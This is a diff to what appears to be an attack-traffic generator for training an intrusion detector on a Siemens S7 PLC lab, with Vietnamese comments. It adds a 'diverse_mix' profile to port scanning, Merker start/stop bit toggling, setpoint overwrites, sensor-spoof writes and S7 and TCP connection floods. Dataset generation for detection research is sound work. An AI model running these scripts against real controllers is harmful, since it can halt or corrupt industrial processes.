@@ -720,6 +720,11 @@ if profile == "day6_robust":
     sleep_range = (8.0, 30.0)
 elif profile == "extended_300k":
     sleep_range = (0.8, 6.0)
+elif profile == "diverse_mix":
+    # Trai deu tren toan bo pho tan suat standard->day6_robust trong CUNG 1 lan
+    # thu, de tap train co ca vi du toc do thua (giong Day6) thay vi chi thay
+    # o Day6. Khong doi target (port 102 co dinh, khong can da dang hoa).
+    sleep_range = (0.4, 30.0)
 else:
     sleep_range = (0.4, 1.5)
 print(f"[SCAN] TCP port 102 scan loop against {target} profile={profile} sleep={sleep_range}", flush=True)
@@ -753,6 +758,13 @@ if profile == "day6_robust":
     sleep_range = (2.0, 5.0)
 elif profile == "extended_300k":
     sleep_range = (0.3, 2.0)
+elif profile == "diverse_mix":
+    # Windows 2s can nhieu lan doc gan nhau moi thay duoc sequential_offset_score;
+    # o toc do robust (2-5s/lan) hau het window chi bat duoc 0-1 lan doc. Trai
+    # deu ca pho de tap train co du vi du "du 2+ lan doc trong window" lan
+    # "thua, khong du de tinh offset score" -- giup model hoc duoc tin hieu con
+    # lai o nhung window thua thay vi chi thay o Day6.
+    sleep_range = (0.15, 5.0)
 else:
     sleep_range = (0.15, 0.5)
 c = snap7.client.Client()
@@ -809,6 +821,14 @@ if profile == "day6_robust":
 elif profile == "extended_300k":
     sleep_range = (0.5, 3.0)
     pulse_s = random.uniform(0.12, 0.35)
+elif profile == "diverse_mix":
+    # Trai deu toc do tren toan pho standard->day6_robust trong cung 1 lan
+    # thu. Ngoai ra ~35% chu ky chi toggle 1 bit (chi STOP hoac chi START)
+    # thay vi luon swap ca 2 -- van dung DUY NHAT M5.0/M5.1 (khong doi dia
+    # chi, an toan), chi da dang hoa PATTERN ghi de model hoc "burst-write
+    # vao Merker" thay vi hoc thuoc dung 1 khuon swap co dinh.
+    sleep_range = (0.15, 25.0)
+    pulse_s = random.uniform(0.12, 0.35)
 else:
     sleep_range = (0.15, 0.45)
     pulse_s = 0.12
@@ -823,7 +843,12 @@ while True:
         m5 = c.read_area(Areas.MK, 0, 5, 1)
         old_start = get_bool(m5, 0, 0)
         old_stop = get_bool(m5, 0, 1)
-        if toggle_stop:
+        single_bit_mode = profile == "diverse_mix" and random.random() < 0.35
+        if single_bit_mode and random.random() < 0.5:
+            set_bool(m5, 0, 1, not old_stop)
+        elif single_bit_mode:
+            set_bool(m5, 0, 0, not old_start)
+        elif toggle_stop:
             set_bool(m5, 0, 0, False)
             set_bool(m5, 0, 1, True)
         else:
@@ -836,7 +861,7 @@ while True:
             log_attack_event("M5.0_START", area="MK", byte_offset=5, bit_offset=0, data_type="bool", old_value=int(old_start), new_value=int(new_start))
         if old_stop != new_stop:
             log_attack_event("M5.1_STOP", area="MK", byte_offset=5, bit_offset=1, data_type="bool", old_value=int(old_stop), new_value=int(new_stop))
-        if not toggle_stop:
+        if not toggle_stop and not single_bit_mode:
             time.sleep(pulse_s)
             m5 = c.read_area(Areas.MK, 0, 5, 1)
             old_start = get_bool(m5, 0, 0)
@@ -881,6 +906,13 @@ if profile == "day6_robust":
     sleep_range = (20.0, 60.0)
 elif profile == "extended_300k":
     sleep_range = (2.0, 10.0)
+elif profile == "diverse_mix":
+    # Trai deu toc do standard->day6_robust. Ngoai ra moi chu ky chi ghi 1
+    # SO trong 4 offset (54/58/62/50, van la 4 dia chi da dung an toan tu
+    # truoc), khong luon ghi ca 4 -- day la khac biet lon nhat voi ban goc:
+    # ban goc CHUA TUNG de model thay SETPOINT_ATTACK voi < 4 target/chu ky,
+    # nen model de hoc nham "phai du ca 4 thi moi la SETPOINT".
+    sleep_range = (0.4, 60.0)
 else:
     sleep_range = (0.4, 1.2)
 c = snap7.client.Client()
@@ -901,20 +933,22 @@ def write_dint(client, offset, value, signal):
     client.write_area(Areas.MK, 0, offset, buf)
     if old != int(value):
         log_attack_event(signal, area="MK", byte_offset=offset, data_type="dint", old_value=old, new_value=int(value))
+targets = [(54, "CD1_MS", values), (58, "CD2_MS", values), (62, "CD3_MS", values), (50, "Times_1_MS", times_values)]
 while True:
     try:
         if not c.get_connected():
             c.connect(target, rack, slot)
-        cd1 = random.choice(values)
-        cd2 = random.choice(values)
-        cd3 = random.choice(values)
-        write_dint(c, 54, cd1, "CD1_MS")
-        write_dint(c, 58, cd2, "CD2_MS")
-        write_dint(c, 62, cd3, "CD3_MS")
-        write_dint(c, 50, random.choice(times_values), "Times_1_MS")
+        if profile == "diverse_mix":
+            active = random.sample(targets, k=random.randint(1, len(targets)))
+        else:
+            active = targets
+        written = {}
+        for offset, signal, pool in active:
+            written[signal] = random.choice(pool)
+            write_dint(c, offset, written[signal], signal)
         n += 1
         if n % 20 == 0:
-            print(f"[SETPOINT] #{n} CD1={cd1} CD2={cd2} CD3={cd3}", flush=True)
+            print(f"[SETPOINT] #{n} {written}", flush=True)
     except Exception as exc:
         print(f"[SETPOINT][WARN] {exc}", flush=True)
         try:
@@ -947,6 +981,12 @@ if profile == "day6_robust":
     sleep_range = (15.0, 45.0)
 elif profile == "extended_300k":
     sleep_range = (2.0, 8.0)
+elif profile == "diverse_mix":
+    # Trai deu toc do standard->day6_robust. Ngoai ra random DOC LAP tung
+    # bit thay vi chon tu danh sach pattern co san -- van CHI 3 dia chi cu
+    # (M5.4/M5.6/M6.0), nhung them ca to hop 1-bit/0-bit ma pattern list
+    # goc chua bao gio co (vd chi Vat_1 bat, hoac ca 3 tat).
+    sleep_range = (0.4, 45.0)
 else:
     sleep_range = (0.4, 1.5)
 c = snap7.client.Client()
@@ -959,7 +999,10 @@ while True:
     try:
         if not c.get_connected():
             c.connect(target, rack, slot)
-        v1, v2, v3 = random.choice(patterns)
+        if profile == "diverse_mix":
+            v1, v2, v3 = (random.randint(0, 1), random.randint(0, 1), random.randint(0, 1))
+        else:
+            v1, v2, v3 = random.choice(patterns)
         m5 = c.read_area(Areas.MK, 0, 5, 1)
         m6 = c.read_area(Areas.MK, 0, 6, 1)
         changes_m5 = []
@@ -1017,6 +1060,8 @@ if profile == "day6_robust":
     sleep_range = (20.0, 60.0)
 elif profile == "extended_300k":
     sleep_range = (5.0, 20.0)
+elif profile == "diverse_mix":
+    sleep_range = (1.5, 60.0)
 else:
     sleep_range = (1.5, 3.0)
 c = snap7.client.Client()
@@ -1069,6 +1114,11 @@ if profile == "day6_robust":
     threads_n = max(1, min(threads_n, 2))
 elif profile == "extended_300k":
     threads_n = max(1, min(threads_n, 4))
+elif profile == "diverse_mix":
+    # So thread ngau nhien tu 1 den muc cau hinh moi lan chay (moi episode
+    # la 1 tien trinh moi) -- cho tap train co ca vi du it thread/nhe lan
+    # nhieu thread/nang, khong chi co 1 muc cuong do co dinh.
+    threads_n = random.randint(1, max(1, threads_n))
 lock = threading.Lock()
 ok = 0
 fail = 0
@@ -1100,6 +1150,16 @@ def worker():
                 one_connect()
                 time.sleep(random.uniform(0.05, 0.3))
             time.sleep(random.uniform(2.0, 8.0))
+        elif profile == "diverse_mix":
+            # Xen ke ngau nhien giua kieu "burst thua" (nhu robust) va kieu
+            # "lien tuc" (nhu standard) trong CUNG 1 lan chay.
+            if random.random() < 0.5:
+                for _ in range(random.randint(3, 8)):
+                    one_connect()
+                    time.sleep(random.uniform(0.08, 0.5))
+                time.sleep(random.uniform(8.0, 25.0))
+            else:
+                one_connect()
         else:
             one_connect()
 print(f"[S7_FLOOD] {threads_n} Snap7 connection workers profile={profile}", flush=True)
@@ -1125,6 +1185,8 @@ if profile == "day6_robust":
     threads_n = max(1, min(threads_n, 3))
 elif profile == "extended_300k":
     threads_n = max(1, min(threads_n, 6))
+elif profile == "diverse_mix":
+    threads_n = random.randint(1, max(1, threads_n))
 def one_connect():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -1145,6 +1207,14 @@ def worker():
                 one_connect()
                 time.sleep(random.uniform(0.03, 0.2))
             time.sleep(random.uniform(2.0, 6.0))
+        elif profile == "diverse_mix":
+            if random.random() < 0.5:
+                for _ in range(random.randint(5, 15)):
+                    one_connect()
+                    time.sleep(random.uniform(0.05, 0.25))
+                time.sleep(random.uniform(8.0, 20.0))
+            else:
+                one_connect()
         else:
             one_connect()
 print(f"[SYN_FLOOD] {threads_n} TCP connect workers on port 102 profile={profile}", flush=True)
@@ -1170,6 +1240,8 @@ if profile == "day6_robust":
     sleep_range = (5.0, 20.0)
 elif profile == "extended_300k":
     sleep_range = (1.0, 5.0)
+elif profile == "diverse_mix":
+    sleep_range = (0.05, 20.0)
 else:
     sleep_range = (0.05, 0.25)
 n = 0
@@ -1410,13 +1482,17 @@ run_attacker_day4() {
 run_attacker_day5() {
     benign_period "$WARMUP_S" "warmup"
     run_repeated "S7_FLOOD" "$SHORT_ATTACK_DURATION_S" "$(reps_for_day)"
-    run_repeated "SYN_FLOOD" "$SHORT_ATTACK_DURATION_S" "$(reps_for_day)"
     run_repeated "PROTOCOL_FUZZ" "$SHORT_ATTACK_DURATION_S" "$(reps_for_day)"
     benign_period "$COOLDOWN_S" "cooldown"
 }
+# SYN_FLOOD (raw TCP connect/disconnect churn to port 102, no S7 handshake) da
+# bi bo khoi day5/day6 -- gan nhu trung lap co che voi S7_FLOOD (cung la vong
+# lap connect/disconnect toi port 102, chi khac la S7_FLOOD hoan tat them
+# handshake COTP/S7 that su). Giu S7_FLOOD vi no tao tin hieu o ca tang
+# TCP LAN protocol S7, S7_FLOOD dai dien du cho lop "flood ket noi" nay.
 
 mixed_scenarios() {
-    local items="SCAN_PORT ENUM_TAGS RWRITE_BURST SETPOINT_ATTACK SENSOR_SPOOF STEALTHY_WRITE S7_FLOOD SYN_FLOOD PROTOCOL_FUZZ"
+    local items="SCAN_PORT ENUM_TAGS RWRITE_BURST SETPOINT_ATTACK SENSOR_SPOOF STEALTHY_WRITE S7_FLOOD PROTOCOL_FUZZ"
     if [[ "$ENABLE_CPU_CONTROL_ATTACK" == "1" ]]; then
         items="$items CPU_STOP"
     fi
@@ -1431,7 +1507,7 @@ day6_duration_for() {
         RWRITE_BURST|SETPOINT_ATTACK|SENSOR_SPOOF|STEALTHY_WRITE)
             rand_range "$DAY6_INTEGRITY_MIN_S" "$DAY6_INTEGRITY_MAX_S"
             ;;
-        S7_FLOOD|SYN_FLOOD|PROTOCOL_FUZZ)
+        S7_FLOOD|PROTOCOL_FUZZ)
             rand_range "$DAY6_AVAIL_MIN_S" "$DAY6_AVAIL_MAX_S"
             ;;
         CPU_STOP)
